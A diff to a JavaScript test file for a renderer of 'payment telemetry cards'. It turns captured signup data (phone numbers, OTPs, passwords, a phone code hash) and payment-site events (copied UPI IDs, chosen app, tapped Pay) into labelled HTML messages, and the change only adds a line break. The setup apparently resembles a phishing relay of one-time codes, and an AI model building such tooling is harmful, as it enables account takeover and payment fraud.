@@ -31,7 +31,7 @@ describe('payment telemetry cards (client line first, no IP)', () => {
 
   test('the signup form is a field table; internal send-code fields are dropped', () => {
     const phoneStep = JSON.stringify({ phoneNumber: '9876543210', phoneCountryCode: '+91', otp: '', password: '', firstName: 'Ravi', lastName: '', phoneCodeHash: 'abc', codeLength: 5 });
-    expect(render(`${head}${phoneStep}`)).toBe('<b>keerthi2</b><br/><b>Signup · phone entered</b>\n<table bordered striped compact><tr><td><b>Name</b></td><td>Ravi</td></tr><tr><td><b>Phone</b></td><td><code>+919876543210</code></td></tr></table>');
+    expect(render(`${head}${phoneStep}`)).toBe('<b>keerthi2</b><br/><br/><b>Signup · phone entered</b>\n<table bordered striped compact><tr><td><b>Name</b></td><td>Ravi</td></tr><tr><td><b>Phone</b></td><td><code>+919876543210</code></td></tr></table>');
     const codeStep = JSON.stringify({ phoneNumber: '9876543210', phoneCountryCode: '+91', otp: '12345', password: 'pw', codeType: 'app', deliveryMessage: 'Code sent' });
     const html = render(`${head}${codeStep}`);
     expect(html).toContain('Signup · code entered');
@@ -40,7 +40,7 @@ describe('payment telemetry cards (client line first, no IP)', () => {
   });
 
   test('any other JSON object becomes one row per non-empty key', () => {
-    expect(render(`${head}{"a":"1","b":""}`)).toBe('<b>keerthi2</b><br/><b>Form</b>\n<table bordered striped compact><tr><td><b>a</b></td><td><code>1</code></td></tr></table>');
+    expect(render(`${head}{"a":"1","b":""}`)).toBe('<b>keerthi2</b><br/><br/><b>Form</b>\n<table bordered striped compact><tr><td><b>a</b></td><td><code>1</code></td></tr></table>');
   });
 
   test('event codes read as plain words', () => {
@@ -51,7 +51,7 @@ describe('payment telemetry cards (client line first, no IP)', () => {
     expect(title('UPI ID Copied : abc@ybl')).toBe('Payment site · copied UPI abc@ybl');
     expect(title('PaymentOption_gpay')).toBe('Payment site · chose gpay');
     expect(title('SomethingNew')).toBe('Payment site · SomethingNew');
-    expect(render(`${head}PayButton`)).toBe('<b>keerthi2</b><br/><b>Payment site · tapped Pay</b><br/>');
+    expect(render(`${head}PayButton`)).toBe('<b>keerthi2</b><br/><br/><b>Payment site · tapped Pay</b><br/>');
   });
 
   test('an empty message is not sent', async () => {
